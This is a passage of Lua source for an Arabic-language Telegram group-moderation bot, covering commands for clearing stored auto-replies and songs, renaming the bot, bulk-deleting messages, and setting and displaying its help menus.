if msg.content_.text_ == 'حذف الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or msg.content_.text_ == 'مسح الردود' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or msg.content_.text_ == 'حذف ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) or msg.content_.text_ == 'مسح ردود المدير' and is_owner(msg.sender_user_id_, msg.chat_id_) and Abbas_Abs(msg) then
local redod = DevAbs:smembers(DevProx..'rep_owner'..msg.chat_id_..'')
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ تـوجـد رډوډ مضـٱفـة" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(DevProx..'add:repgp'..msg.sender_user_id_..''..msg.chat_id_..'')
DevAbs:del(DevProx..'gif_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'voice_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'audio_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'photo_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'stecker_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'video_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'text_repgp'..v..msg.chat_id_)
DevAbs:del(DevProx..'rep_owner'..msg.chat_id_..'',msg.content_.text_)
end
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱڵرډوډ \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
return false
end
end
--     Source DevProx     --
if  msg.content_.text_ == "ردود المطور" and is_sudo(msg) or msg.content_.text_ == "الردود العام" and is_sudo(msg) or msg.content_.text_ == "ردود العام" and is_sudo(msg) or msg.content_.text_ == "↫ الردود العام ☬" and is_sudo(msg) then
local redod = DevAbs:smembers(DevProx.."rep_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ تـوجـد رډوډ مضـٱفـة" ,  1, "md")
else
local i = 1
msg_rep = '☬︙رډوډ ٱڵـمطور ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k.." ⌯ *❨ '..v..' ❩* \n"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
--     Source DevProx     --
if msg.content_.text_ == "حذف ردود المطور" and is_sudo(msg) or msg.content_.text_ == "حذف ردود العام" and is_sudo(msg) or msg.content_.text_ == "مسح ردود المطور" and is_sudo(msg) then
local redod = DevAbs:smembers(DevProx.."rep_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ تـوجـد رډوډ مضـٱفـة" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(DevProx.."add:repallt"..v)
DevAbs:del(DevProx.."gif_repall"..v)
DevAbs:del(DevProx.."voice_repall"..v)
DevAbs:del(DevProx.."audio_repall"..v)
DevAbs:del(DevProx.."photo_repall"..v)
DevAbs:del(DevProx.."stecker_repall"..v)
DevAbs:del(DevProx.."video_repall"..v)
DevAbs:del(DevProx.."text_repall"..v)
DevAbs:del(DevProx.."rep_sudo",msg.content_.text_)
end
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف رډوډ ٱڵـمطور \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
return false
end
end 
--     Source DevProx     --
if msg.content_.text_ == "اغاني" and Abbas_Abs(msg) or msg.content_.text_ == "↫ الاغاني المضافه ☬" and Abbas_Abs(msg) then
local redod = DevAbs:smembers(DevProx.."repmusic_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ تـوجـد ٱغٱني مضـٱفـة" ,  1, "md")
else
local i = 1
msg_rep = '☬︙ٱلٱغٱني ٱڵمضٱفه ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
for k,v in pairs(redod) do
msg_rep = msg_rep ..k.." ⌯ *❨ '..v..' ❩* \n"
end
Dev_Abs(msg.chat_id_, msg.id_, 1, msg_rep,1, "md")
end
return false
end
--     Source DevProx     --
if msg.content_.text_ == "حذف الاغاني" and is_sudo(msg) and Abbas_Abs(msg) or msg.content_.text_ == "مسح الاغاني" and is_sudo(msg) and Abbas_Abs(msg) or msg.content_.text_ == "حذف الاغاني المضافه" and is_sudo(msg) and Abbas_Abs(msg) then
local redod = DevAbs:smembers(DevProx.."repmusic_sudo")
if #redod == 0 then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙لٱ تـوجـد ٱغٱني مضـٱفـة" ,  1, "md")
else
for k,v in pairs(redod) do
DevAbs:del(DevProx.."add:repmusic"..v)
DevAbs:del(DevProx.."voice_repmusic"..v)
DevAbs:del(DevProx.."audio_repmusic"..v)
DevAbs:del(DevProx.."video_repmusic"..v)
DevAbs:del(DevProx.."repmusic_sudo",msg.content_.text_)
end
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف جميع ٱلٱغٱني \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
return false
end
end 
--     Source DevProx     --
if text and text:match("^تغيير اسم البوت$") or text and text:match("^وضع اسم البوت$") or text and text:match("^ضع اسم البوت$") then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙ٱرسـڵ ٱسـم ٱڵـبۄت ٱلٱن \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
DevAbs:set('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'', 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' or text == 'مسح اسم البوت' then
if not is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙ڵڵمطور ٱلٱسٱسي فقط ', 1, 'md')
else
DevAbs:del('ABS_PROX:'..bot_id..'name_bot')
local ABS_PROX = '☬︙ٱهلٱ عزيزي ↫ '..abs_rank(msg)..' \n☬︙تـۖم حـذف ٱسـم ٱڵـبۄت \n ✓'
absmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, ABS_PROX, 15, string.len(msg.sender_user_id_))
end end 
--     Source DevProx     --
if is_admin(msg.sender_user_id_, msg.chat_id_) then
if text and text:match('^تنظيف (%d+)$') and Abbas_Abs(msg) then    
local Number = tonumber(text:match('^تنظيف (%d+)$')) 
if Number > 1000 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱتستطيع تنظيف ٱكثر من 1000 رسٱڵه', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
delete_msg(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تنظيف *'..Number..'* من ٱڵرسٱئڵ', 1, 'md')
end 
if text and text:match('^حذف (%d+)$') and Abbas_Abs(msg) then    
local Number = tonumber(text:match('^حذف (%d+)$')) 
if Number > 1000 then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙لٱتستطيع تنظيف ٱكثر من 1000 رسٱڵه', 1, 'md')
return false  
end  
local Message = msg.id_
for i=1,tonumber(Number) do
delete_msg(msg.chat_id_,{[0]=Message})
Message = Message - 1048576 
end
Dev_Abs(msg.chat_id_, msg.id_, 1, '☬︙تـۖم تنظيف *'..Number..'* من ٱڵرسٱئڵ', 1, 'md')
end 
end
--     Source DevProx     --
if text and text:match("^استعاده الاوامر$") and is_leader(msg) or text and text:match("^استعادة كلايش الاوامر$") and is_leader(msg) then
DevAbs:del(DevProx..'bot:help', text)
DevAbs:del(DevProx..'bot:help1', text)
DevAbs:del(DevProx..'bot:help2', text)
DevAbs:del(DevProx..'bot:help3', text) 
DevAbs:del(DevProx..'bot:help4', text)
DevAbs:del(DevProx..'bot:help5', text) 
DevAbs:del(DevProx..'bot:help6', text) 
DevAbs:del(DevProx..'bot:help7', text)
DevAbs:del(DevProx..'bot:help8', text) 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم ٱستعٱدة ٱڵـكـلٱيش ٱلٱصڵيه" ,  1, "md") 
end
if text and text:match("^تعيين الاوامر$") and is_leader(msg) or text and text:match("^تعيين امر الاوامر$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسـڵ كڵيشة (الاوامر) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help0'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help0'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(DevProx..'bot:help0'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^الاوامر$") or text and text:match("^اوامر$") or text and text:match("^مساعده$") then
local help = DevAbs:get(DevProx..'bot:help')
local text =  [[
☬︙اهلا بك في قائمة الاوامر ↫ ⤈ 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙م1 ↫ اوامـر حماية المجموعة 
☬︙م2 ↫ اوامـر المشرفين
☬︙م3 ↫ اوامـر الخدمة
☬︙م4 ↫ اوامـر الوضع والتعيين
☬︙م5 ↫ اوامـر الرفع والتنزيل
☬︙م6 ↫ اوامـر التفعيل والتعطيل
☬︙م7 ↫ اوامـر حذف القوائم
☬︙م8 ↫ اوامـر المطورين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]] 
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م1$") and is_leader(msg) or text and text:match("^تعيين امر م١$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسـڵ كڵيشة (م1) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help01'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help01'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(DevProx..'bot:help01'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help1', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م1$") or text and text:match("^م١$") or text and text:match("^اوامر1$") or text and text:match("^اوامر١$") then
local help = DevAbs:get(DevProx..'bot:help1')
local text =  [[
☬︙اوامر حماية المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙قفل • فتح ↫ الروابط
☬︙قفل • فتح ↫ المعرف
☬︙قفل • فتح ↫ البوتات
☬︙قفل • فتح ↫ الشارحه
☬︙قفل • فتح ↫ المتحركه
☬︙قفل • فتح ↫ الملصقات
☬︙قفل • فتح ↫ الملفات
☬︙قفل • فتح ↫ الصور
☬︙قفل • فتح ↫ الفيديو
☬︙قفل • فتح ↫ الاونلاين
☬︙قفل • فتح ↫ الدردشه
☬︙قفل • فتح ↫ التوجيه
☬︙قفل • فتح ↫ الاغاني
☬︙قفل • فتح ↫ الصوت
☬︙قفل • فتح ↫ الجهات
☬︙قفل • فتح ↫ الماركداون
☬︙قفل • فتح ↫ الحمايه
☬︙قفل • فتح ↫ التكرار
☬︙قفل • فتح ↫ الهاشتاك
☬︙قفل • فتح ↫ التعديل
☬︙قفل • فتح ↫ التثبيت
☬︙قفل • فتح ↫ الاشعارات
☬︙قفل • فتح ↫ الكلايش
☬︙قفل • فتح ↫ الشبكات
☬︙قفل • فتح ↫ المواقع
☬︙قفل • فتح ↫ الفشار
☬︙قفل • فتح ↫ الكفر
☬︙قفل • فتح ↫ الطائفيه
☬︙قفل • فتح ↫ الكل
☬︙قفل • فتح ↫ العربيه
☬︙قفل • فتح ↫ الانكليزيه
☬︙قفل • فتح ↫ الفارسيه
☬︙قفل • فتح ↫ التفليش
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر حمايه اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙قفل • فتح + الامر ↫ ⤈
☬︙الفارسيه بالطرد
☬︙البوتات بالطرد
☬︙البوتات بالتقييد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م2$") and is_leader(msg) or text and text:match("^تعيين امر م٢$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙ٱرسـڵ كڵيشة (م2) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help21'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help21'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(DevProx..'bot:help21'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help2', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م2$") or text and text:match("^م٢$") or text and text:match("^اوامر2$") or text and text:match("^اوامر٢$") then
local help = DevAbs:get(DevProx..'bot:help2')
local text =  [[
☬︙اوامر المشرفين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر الطرد والحظر ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙طرد الحسابات المحذوفه
☬︙طرد ↫ بالرد بالمعرف بالايدي
☬︙حظر • الغاء حظر ⤈
⌯ بالرد • بالمعرف • بالايدي ⌯
☬︙كتم • الغاء كتم ⤈
⌯ بالرد • بالمعرف • بالايدي ⌯
☬︙تقييد • الغاء تقييد ⤈
⌯ بالرد • بالمعرف • بالايدي ⌯
☬︙كشف القيود
⌯ بالرد • بالمعرف ⌯
☬︙رفع القيود
⌯ بالرد • بالمعرف • بالايدي ⌯
☬︙منع + الكلمه
☬︙الغاء منع + الكلمه
☬︙تقييد دقيقه + عدد الدقائق
☬︙تقييد ساعه + عدد الساعات
☬︙تقييد يوم + عدد الايام
☬︙الغاء تقييد ↫ لالغاء تقييد بالوقت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙قوائم المجموعة ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙حذف القوائم ↫ لحذف الكل
☬︙حذف • مسح + اسم القائمة ↫ ⤈
☬︙اسم القائمة ↫ لعرض معلوماتها
☬︙{ المميزين } • { قائمه المنع }
☬︙{ المنشئين } • { المحظورين }
☬︙{ المدراء } • { الاعدادات }
☬︙{ الادمنيه } • { المكتومين }
☬︙{ المطايه } • { الصلاحيات }
☬︙{ المقيدين } • { المميزين العام }
☬︙{ الدعم } • { المدراء العامين }
☬︙{ الردود } • { الادمنيه العامين }
☬︙{ الاوامر المضافه } • { البوتات }
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙كللهم + الكلمه
☬︙تاك للكل • صيحهم

☬︙تثبيت • الغاء التثبيت
☬︙اعاده التثبيت

☬︙تنظيف + العدد

☬︙اضف • حذف ↫ رد
☬︙اضف • حذف ↫ امر

☬︙اضف • حذف ↫ صلاحيه
☬︙جلب • حذف ↫ الترحيب

☬︙اضف رسائل + الايدي
☬︙اضف ترحيب + الكليشه

☬︙كشف البوتات
☬︙طرد البوتات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م3$") and is_leader(msg) or text and text:match("^تعيين امر م٣$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙⌯ ٱرسـڵ كڵيشة (م3) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help31'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help31'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(DevProx..'bot:help31'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help3', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م3$") or text and text:match("^م٣$") or text and text:match("^اوامر3$") or text and text:match("^اوامر٣$") then
local help = DevAbs:get(DevProx..'bot:help3')
local text =  [[
☬︙الاوامر الخدميه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اهمس
☬︙الوقت 
☬︙التاريخ
☬︙زخرفه
☬︙الرابط
☬︙موقعي
☬︙رتبتي
☬︙معلوماتي
☬︙جهاتي
☬︙صورتي
☬︙صورتي + الرقم
☬︙رسائلي
☬︙رسائلي اليوم
☬︙حذف رسائلي
☬︙اضف رسائل + الايدي
☬︙اسمي
☬︙معرفي
☬︙ايدي
☬︙ايديي
☬︙نقاطي
☬︙بيع نقاطي
☬︙الالعاب
☬︙القوانين
☬︙رابط الحذف
☬︙منو ضافني
☬︙السورس
☬︙المطور
☬︙تاك للكل
☬︙للهم + الكلمه 
☬︙مشاهدات المنشور
☬︙ايدي المجموعه
☬︙اسم المجموعه
☬︙معلومات المجموعه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙كول + الكلمه
☬︙طقس + اسم المدينه
☬︙بوسه • بوسها ↫ بالرد
☬︙هينه ↫ بالرد بالمعرف
☬︙رتبته ↫ بالرد بالمعرف
☬︙صيحه ↫ بالرد • بالمعرف
☬︙صيحها ↫ بالرد • بالمعرف
☬︙ايدي ↫ بالرد • بالمعرف • بالايدي
☬︙كشف ↫ بالرد • بالمعرف • بالايدي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م4$") and is_leader(msg) or text and text:match("^تعيين امر م٤$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙⌯ ٱرسـڵ كڵيشة (م4) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help41'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه" ,  1, "md")
DevAbs:set(DevProx..'bot:help41'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help4', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٤$") or text and text:match("^م4$") or text and text:match("^اوامر4$") or text and text:match("^اوامر٤$") then
local help = DevAbs:get(DevProx..'bot:help4')
local text =  [[
☬︙اوامر الوضع ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر وضع الايدي ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙تغيير الايدي ↫ لتغيير الكليشه
☬︙تعيين الايدي ↫ لتغيير الكليشه
☬︙حذف الايدي ↫ لحذف الكليشه
☬︙ضع ↫ الايدي بالصوره
☬︙ضع ↫ الايدي بدون صوره
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر وضع التكرار ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙ضع ↫ تكرار + العدد
☬︙ضع ↫ التكرار بالطرد
☬︙ضع ↫ التكرار بالحذف
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙ضع + الامر ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙ضع ↫ صوره
☬︙ضع ↫ الرابط
☬︙ضع ↫ ترحيب
☬︙ضع ↫ اسم + الاسم
☬︙ضع ↫ قوانين + الكليشة
☬︙ضع ↫ عدد الاحرف + العدد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م5$") and is_leader(msg) or text and text:match("^تعيين امر م٥$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙⌯ ٱرسـڵ كڵيشة (م5) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help51'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه " ,  1, "md")
DevAbs:set(DevProx..'bot:help51'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help5', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٥$") or text and text:match("^م5$") or text and text:match("^اوامر5$") or text and text:match("^اوامر٥$") then
local help = DevAbs:get(DevProx..'bot:help5')
local text =  [[
☬︙اوامر الرفع والتنزيل ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙الاوامر الخاصه بالمشرفين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙تنزيل الكل
☬︙رفع المشرفين
☬︙رفع • تنزيل ↫ منشئ
☬︙رفع • تنزيل ↫ مدير
☬︙رفع • تنزيل ↫ ادمن
☬︙رفع • تنزيل ↫ مميز
☬︙رفع • تنزيل ↫ ادمن بالكروب
☬︙رفع بكل الصلاحيات
☬︙الغاء خاصيه التثبيت
☬︙الغاء خاصيه تغيير الاسم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙الاوامر الخاصه بالمطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙رفع • تنزيل ↫ مدير عام
☬︙رفع • تنزيل ↫ ادمن عام
☬︙رفع • تنزيل ↫ مميز عام
☬︙رفع • تنزيل ↫ مطور ثالث
☬︙رفع • تنزيل ↫ منشئ اساسي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م6$") and is_leader(msg) or text and text:match("^تعيين امر م٦$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙⌯ ٱرسـڵ كڵيشة (م6) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help61'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help61'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه" ,  1, "md")
DevAbs:set(DevProx..'bot:help61'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help6', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٦$") or text and text:match("^م6$") or text and text:match("^اوامر6$") or text and text:match("^اوامر٦$") then
local help = DevAbs:get(DevProx..'bot:help6')
local text =  [[
☬︙اوامر التفعيل والتعطيل ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر التفعيل للمشرفين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙تفعيل • تعطيل ↫ الالعاب
☬︙تفعيل • تعطيل ↫ الايدي
☬︙تفعيل • تعطيل ↫ الرابط
☬︙تفعيل • تعطيل ↫ الحظر
☬︙تفعيل • تعطيل ↫ الطرد
☬︙تفعيل • تعطيل ↫ ضافني
☬︙تفعيل • تعطيل ↫ اطردني
☬︙تفعيل • تعطيل ↫ ردود البوت
☬︙تفعيل • تعطيل ↫ جلب الصوره
☬︙تفعيل • تعطيل ↫ تنبيه التغيرات
☬︙تفعيل • تعطيل ↫ الايدي بالصوره
☬︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر التفعيل للمطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙تفعيل ⌯ تعطيل ⌯
☬︙تفعيل • تعطيل ↫ التنبيه
☬︙تفعيل • تعطيل ↫ التواصل
☬︙تفعيل • تعطيل ↫ المغادره
☬︙تفعيل • تعطيل ↫ رد الخاص
☬︙تفعيل • تعطيل ↫ كل الكروبات
☬︙تفعيل • تعطيل ↫ البوت الخدمي
☬︙تفعيل • تعطيل ↫ الاشتراك الاجباري
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙[𝗗𝗘𝗩 𝗕𝗢𝗧](https://t.me/]]..ExDevUser..[[) 
☬︙[𝗧𝗘𝗔𝗠 𝗗𝗘𝗩](https://t.me/Dev_Prox)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (help or text), 1, 'md')
end
if text and text:match("^تعيين امر م7$") and is_leader(msg) or text and text:match("^تعيين امر م٧$") and is_leader(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙⌯ ٱرسـڵ كڵيشة (م7) ٱلٱن " ,  1, "md")
DevAbs:set(DevProx..'bot:help71'..msg.sender_user_id_..'', 'msg')
return false end
if text and text:match("^(.*)$") then
local ABS_PROX =  DevAbs:get(DevProx..'bot:help71'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, "☬︙تـۖم حفـۨظ ٱڵكڵيشة ٱڵـجـډيـډه" ,  1, "md")
DevAbs:set(DevProx..'bot:help71'..msg.sender_user_id_..'', 'no')
DevAbs:set(DevProx..'bot:help7', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text and text:match("^م٧$") or text and text:match("^م7$") or text and text:match("^اوامر7$") or text and text:match("^اوامر٧$") then
local help = DevAbs:get(DevProx..'bot:help7')
local text =  [[
☬︙اوامر حذف القوائم ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙اوامر الحذف للمشرفين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
☬︙حذف الردود
☬︙حذف القوائم
☬︙حذف الروابط
☬︙حذف البوتات
☬︙حذف المدراء
☬︙حذف الادمنيه
☬︙حذف المنشئين
☬︙حذف المميزين
☬︙حذف المقيدين
☬︙حذف المكتومين
